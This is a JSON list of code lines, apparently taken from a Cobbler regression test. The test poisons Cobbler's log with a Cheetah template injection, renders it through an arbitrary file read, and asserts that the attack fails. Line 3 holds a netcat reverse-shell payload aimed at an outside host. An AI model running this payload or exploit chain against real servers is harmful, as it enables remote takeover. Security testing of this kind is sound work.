[
    {
        "line": 3,
        "fullcodeline": "exploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'"
    },
    {
        "line": 4,
        "fullcodeline": "cobbler_api = try_connect(\"http://localhost/cobbler_api\")"
    },
    {
        "line": 7,
        "fullcodeline": "profiles = cobbler_api.get_profiles()"
    },
    {
        "line": 8,
        "fullcodeline": "target = profiles[0][\"name\"]"
    },
    {
        "line": 10,
        "fullcodeline": "print(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")"
    },
    {
        "line": 11,
        "fullcodeline": "result_stage_1 = cobbler_api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}')"
    },
    {
        "line": 12,
        "fullcodeline": "print(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")"
    },
    {
        "line": 13,
        "fullcodeline": "result_stage_2 = cobbler_api.generate_script(target, \"\", \"/var/log/cobbler/cobbler.log\")"
    },
    {
        "line": 16,
        "fullcodeline": "assert not result_stage_1.startswith(\"__import__\")"
    },
    {
        "line": 21,
        "fullcodeline": "assert \"ValueError\" in e.faultString"
    }
]